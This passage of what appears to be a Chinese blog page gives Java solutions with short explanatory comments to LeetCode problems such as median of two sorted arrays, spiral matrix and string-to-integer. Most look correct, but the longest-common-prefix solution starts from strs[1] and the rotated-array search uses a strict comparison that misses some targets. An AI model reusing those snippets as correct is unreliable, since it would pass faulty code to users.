class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-寻找两个正序数组的中位数"><a href="#4-寻找两个正序数组的中位数" class="headerlink" title="4. 寻找两个正序数组的中位数"></a><a href="https://leetcode-cn.com/problems/median-of-two-sorted-arrays/">4. 寻找两个正序数组的中位数</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">关键点:找第k小的数</span></span><br><span class="line"><span class="comment">k = 7</span></span><br><span class="line"><span class="comment">A: 1 3 4 9</span></span><br><span class="line"><span class="comment">B: 1 2 3  4 5  6 7 8 9</span></span><br><span class="line"><span class="comment">k = 4</span></span><br><span class="line"><span class="comment">A: 1 3 4 9</span></span><br><span class="line"><span class="comment">B: 4 5  6 7 8 9</span></span><br><span class="line"><span class="comment">k = 2</span></span><br><span class="line"><span class="comment">A: 4 9</span></span><br><span class="line"><span class="comment">B: 4 5  6 7 8 9</span></span><br><span class="line"><span class="comment">k = 1</span></span><br><span class="line"><span class="comment">A: 9</span></span><br><span class="line"><span class="comment">B: 4 5  6 7 8 9</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">findMedianSortedArrays</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> nums1.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums2.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">total</span> <span class="operator">=</span> m + n;</span><br><span class="line">        <span class="keyword">if</span> (total % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">m1</span> <span class="operator">=</span> total / <span class="number">2</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">m2</span> <span class="operator">=</span> total / <span class="number">2</span> - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> (getKth(nums1, nums2, m1 + <span class="number">1</span>) + getKth(nums1, nums2, m2 + <span class="number">1</span>)) / <span class="number">2.0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">m3</span>  <span class="operator">=</span>total / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">return</span> getKth(nums1, nums2, m3 + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="title function_">getKth</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> nums1.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums2.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (index1 == nums1.length) &#123;</span><br><span class="line">                <span class="keyword">return</span> nums2[index2 + k - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (index2 == nums2.length) &#123;</span><br><span class="line">                <span class="keyword">return</span> nums1[index1 + k - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (k == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> Math.min(nums1[index1], nums2[index2]);</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">// 为什么不直接二分,因为如果其中一个数组特别大的时候会消耗一些时间</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> k / <span class="number">2</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">newIndex1</span> <span class="operator">=</span> Math.min(index1 + half, m) - <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">newIndex2</span> <span class="operator">=</span> Math.min(index2 + half, n)  - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums1[newIndex1] &gt; nums2[newIndex2]) &#123;</span><br><span class="line">                k -= newIndex2 - index2 + <span class="number">1</span>;</span><br><span class="line">                index2 = newIndex2 + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                k -= newIndex1 - index1 + <span class="number">1</span>;</span><br><span class="line">                index1 = newIndex1 + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="11-盛最多水的容器"><a href="#11-盛最多水的容器" class="headerlink" title="11. 盛最多水的容器"></a><a href="https://leetcode-cn.com/problems/container-with-most-water/">11. 盛最多水的容器</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">一开始两个指针一个指向开头一个指向结尾，此时容器的底是最大的，接下来随着指针向内移动，会造成容器的底变小，在这种情况下想要让容器盛水变多，就只有在容器的高上下功夫。 那我们该如何决策哪个指针移动呢？我们能够发现不管是左指针向右移动一位，还是右指针向左移动一位，容器的底都是一样的，都比原来减少了 1。这种情况下我们想要让指针移动后的容器面积增大，就要使移动后的容器的高尽量大，所以我们选择指针所指的高较小的那个指针进行移动，这样我们就保留了容器较高的那条边，放弃了较小的那条边，以获得有更高的边的机会。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxArea</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> height.length;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = len - <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">      ans = Math.max(ans, Math.min(height[left], height[right]) * (right - left) );</span><br><span class="line">      <span class="keyword">if</span> (height[left] &gt;= height[right]) &#123;</span><br><span class="line">        right--;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        left++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="88-合并两个有序数组-x2F-x2F"><a href="#88-合并两个有序数组-x2F-x2F" class="headerlink" title="88. 合并两个有序数组&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/merge-sorted-array/">88. 合并两个有序数组</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 双指针, 从后往前</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span> m, <span class="type">int</span>[] nums2, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> m -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> n - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> m + n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &gt;= <span class="number">0</span> &amp;&amp; j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums1[i] &gt; nums2[j]) &#123;</span><br><span class="line">                nums1[index--] = nums1[i--];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                nums1[index--] = nums2[j--];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            nums1[index--] = nums2[j --];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="14-最长公共前缀-x2F"><a href="#14-最长公共前缀-x2F" class="headerlink" title="14. 最长公共前缀&#x2F;"></a><a href="https://leetcode-cn.com/problems/longest-common-prefix/">14. 最长公共前缀</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">longestCommonPrefix</span><span class="params">(String[] strs)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ans</span> <span class="operator">=</span> strs[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; strs.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ( j &lt; ans.length() &amp;&amp; j &lt; strs[i].length() &amp;&amp; ans.charAt(j) == strs[i].charAt(j)) &#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = strs[i].substring(<span class="number">0</span>, j);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="54-螺旋矩阵"><a href="#54-螺旋矩阵" class="headerlink" title="54. 螺旋矩阵"></a><a href="https://leetcode-cn.com/problems/spiral-matrix/">54. 螺旋矩阵</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一圈一圈遍历,外圈遍历结束内圈又是一个新的矩阵</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">spiralOrder</span><span class="params">(<span class="type">int</span>[][] matrix)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> matrix.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> m * n;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> n - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">top</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">bottom</span> <span class="operator">=</span> m - <span class="number">1</span>;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (sum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left; i &lt;= right &amp;&amp; sum &gt; <span class="number">0</span>; i++) &#123;</span><br><span class="line">                res.add(matrix[top][i]);</span><br><span class="line">                sum--;</span><br><span class="line">            &#125;</span><br><span class="line">            top++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> top; i &lt;= bottom &amp;&amp; sum &gt; <span class="number">0</span>; i++) &#123;</span><br><span class="line">                res.add(matrix[i][right]);</span><br><span class="line">                sum--;</span><br><span class="line">            &#125;</span><br><span class="line">            right--;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> right; i &gt;= left &amp;&amp; sum &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">                res.add(matrix[bottom][i]);</span><br><span class="line">                sum--;</span><br><span class="line">            &#125;</span><br><span class="line">            bottom--;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> bottom; i &gt;= top &amp;&amp; sum &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">                res.add(matrix[i][left]);</span><br><span class="line">                sum--;</span><br><span class="line">            &#125;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="59-螺旋矩阵-II-x2F"><a href="#59-螺旋矩阵-II-x2F" class="headerlink" title="59. 螺旋矩阵 II&#x2F;"></a><a href="https://leetcode-cn.com/problems/spiral-matrix-ii/">59. 螺旋矩阵 II</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] generateMatrix(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[n][n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> n * n;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span>  <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> n;</span><br><span class="line">        <span class="type">int</span> <span class="variable">top</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">bottom</span> <span class="operator">=</span> n;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (start &lt;= sum) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left; i &lt; right; i++) &#123;</span><br><span class="line">                res[top][i] = start;</span><br><span class="line">                start++;</span><br><span class="line">            &#125;</span><br><span class="line">            top++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> top; i &lt; bottom; i++) &#123;</span><br><span class="line">                res[i][right - <span class="number">1</span>] = start;</span><br><span class="line">                start++;</span><br><span class="line">            &#125;</span><br><span class="line">            right--;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> right - <span class="number">1</span>; i &gt;= left; i--) &#123;</span><br><span class="line">                res[bottom - <span class="number">1</span>][i] = start;</span><br><span class="line">                start++;</span><br><span class="line">            &#125;</span><br><span class="line">            bottom--;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> bottom - <span class="number">1</span>; i &gt;= top; i--) &#123;</span><br><span class="line">                res[i][left] = start;</span><br><span class="line">                start++;</span><br><span class="line">            &#125;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="33-搜索旋转排序数组-x2F"><a href="#33-搜索旋转排序数组-x2F" class="headerlink" title="33. 搜索旋转排序数组&#x2F;"></a><a href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array/">33. 搜索旋转排序数组</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 二分查找</span></span><br><span class="line"><span class="comment">// 将数组一分为二，其中一定有一个是有序的，另一个可能是有序，也能是部分有序。此时有序部分用二分法查找。无序部分再一分为二，其中一个一定有序，另一个可能有序，可能无序。就这样循环.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> l + ((r - l) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] == target) &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[l] &lt; nums[mid]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[l] &lt;= target &amp;&amp; target &lt; nums[mid]) &#123;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[r] &gt;= target &amp;&amp; target &gt; nums[mid]) &#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="674-最长连续递增序列-x2F"><a href="#674-最长连续递增序列-x2F" class="headerlink" title="674. 最长连续递增序列&#x2F;"></a><a href="https://leetcode-cn.com/problems/longest-continuous-increasing-subsequence/">674. 最长连续递增序列</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findLengthOfLCIS</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums == <span class="literal">null</span> || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                tmp++;</span><br><span class="line">                res = Math.max(res, tmp);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                tmp = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8-字符串转换整数-atoi"><a href="#8-字符串转换整数-atoi" class="headerlink" title="8. 字符串转换整数 (atoi)"></a><a href="https://leetcode-cn.com/problems/string-to-integer-atoi/">8. 字符串转换整数 (atoi)</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">myAtoi</span><span class="params">(String str)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> str.length();</span><br><span class="line">    <span class="type">char</span>[] s = str.toCharArray();</span><br><span class="line">    <span class="comment">// 去掉前导空格</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (index &lt; len &amp;&amp; s[index] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">      index++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 针对全是空格的情况</span></span><br><span class="line">    <span class="keyword">if</span> (index == len) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果出现符号字符,仅第一个有效,并记录正负</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">sign</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> <span class="variable">firstChar</span> <span class="operator">=</span> s[index];</span><br><span class="line">    <span class="keyword">if</span> (firstChar == <span class="string">&#x27;+&#x27;</span>) &#123;</span><br><span class="line">      index++;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (firstChar == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">      index++;</span><br><span class="line">      sign = -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">// 将后续出现的数字字符进行转换</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (index &lt; len) &#123;</span><br><span class="line">      <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s[index];</span><br><span class="line">      <span class="comment">// 判断不合法情况</span></span><br><span class="line">      <span class="keyword">if</span> (c &gt; <span class="string">&#x27;9&#x27;</span> || c &lt; <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 判断范围</span></span><br><span class="line">      <span class="keyword">if</span> (res &gt; Integer.MAX_VALUE / <span class="number">10</span> || (res == Integer.MAX_VALUE / <span class="number">10</span>) &amp;&amp; (c - <span class="string">&#x27;0&#x27;</span>) &gt; Integer.MAX_VALUE % <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.MAX_VALUE;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (res &lt; Integer.MIN_VALUE / <span class="number">10</span> || (res == Integer.MIN_VALUE / <span class="number">10</span>) &amp;&amp; ((c - <span class="string">&#x27;0&#x27;</span>) &gt; -(Integer.MIN_VALUE % <span class="number">10</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.MIN_VALUE;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 开始转换</span></span><br><span class="line">      res = res * <span class="number">10</span> + sign * (c - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">      index++;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="43-字符串相乘"><a href="#43-字符串相乘" class="headerlink" title="43. 字符串相乘"></a><a href="https://leetcode-cn.com/problems/multiply-strings/">43. 字符串相乘</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">multiply</span><span class="params">(String num1, String num2)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> num1.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> num2.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[m + n + <span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> m + n + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> m; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">mul</span> <span class="operator">=</span> (num2.charAt(i) - <span class="string">&#x27;0&#x27;</span>) * (num1.charAt(j) - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                index = i + j + <span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">carry</span> <span class="operator">=</span> (res[index] + mul) /  <span class="number">10</span>;</span><br><span class="line">                res[index] = (res[index] + mul) % <span class="number">10</span>;</span><br><span class="line">                index--;</span><br><span class="line">                res[index] += carry;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; res.length - <span class="number">1</span> &amp;&amp; res[i] == <span class="number">0</span>) &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (; i &lt; res.length; i++) &#123;</span><br><span class="line">            sb.append(res[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="557-反转字符串中的单词-III"><a href="#557-反转字符串中的单词-III" class="headerlink" title="557. 反转字符串中的单词 III"></a><a href="https://leetcode-cn.com/problems/reverse-words-in-a-string-iii/">557. 反转字符串中的单词 III</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对于java而言，String是不可变字符数组，所以无法避免空间的开销</span></span><br><span class="line"><span class="comment">// 使用额外的空间</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        String[] s1 = s.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (String s2:</span><br><span class="line">             s1) &#123;</span><br><span class="line">            stringBuilder.append(<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(s2).reverse().toString());</span><br><span class="line">            stringBuilder.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> stringBuilder.toString().trim();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="238-除自身以外数组的乘积"><a href="#238-除自身以外数组的乘积" class="headerlink" title="238. 除自身以外数组的乘积"></a><a href="https://leetcode-cn.com/problems/product-of-array-except-self/">238. 除自身以外数组的乘积</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 乘积 = 当前数左边的乘积 * 当前数右边的乘积</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span>[] productExceptSelf(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">    <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length];</span><br><span class="line">    <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">      res[i] = k;</span><br><span class="line">      k = k * nums[i]; <span class="comment">// 此时数组存储的是除去当前元素左边的元素乘积</span></span><br><span class="line">    &#125;</span><br><span class="line">    k = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> nums.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">      res[i] *= k;<span class="comment">// k为该数右边的乘积。</span></span><br><span class="line"></span><br><span class="line">      k = nums[i] * k;<span class="comment">// 此时数组等于左边的 * 该数右边的。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

